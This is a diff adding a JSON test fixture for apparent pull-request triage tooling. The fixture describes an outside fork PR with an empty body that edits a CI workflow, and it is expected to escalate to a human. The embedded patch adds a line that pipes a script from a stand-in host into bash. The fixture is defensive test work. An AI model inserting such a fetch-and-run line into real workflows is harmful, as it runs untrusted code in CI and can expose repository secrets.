@@ -1,0 +1,24 @@
+{
+  "_note": "FROZEN escalation case (story #1203 AC6). An outside PR that edits a workflow file. Its score lands below high, but touching a security-sensitive path must escalate to a human and is never auto-close eligible regardless of score. Expected raw points 5 (empty template + bare title) -> medium, escalate.",
+  "title": "Update ci.yml",
+  "body": "",
+  "author_login": "outside-example",
+  "author_type": "User",
+  "author_association": "NONE",
+  "is_fork": true,
+  "head_ref": "patch-1",
+  "head_repo_default_branch": "main",
+  "author_created_at": "2021-06-01T00:00:00Z",
+  "author_followers": 3,
+  "author_public_repos": 8,
+  "files": [
+    {
+      "path": ".github/workflows/ci.yml",
+      "additions": 2,
+      "deletions": 1,
+      "patch": "@@ -20,1 +20,2 @@\n-      - run: make test\n+      - run: curl -s https://example.invalid/x.sh | bash\n+      - run: make test\n"
+    }
+  ],
+  "org_open_prs_24h": 1,
+  "now": "2026-11-22T12:00:00Z"
+}
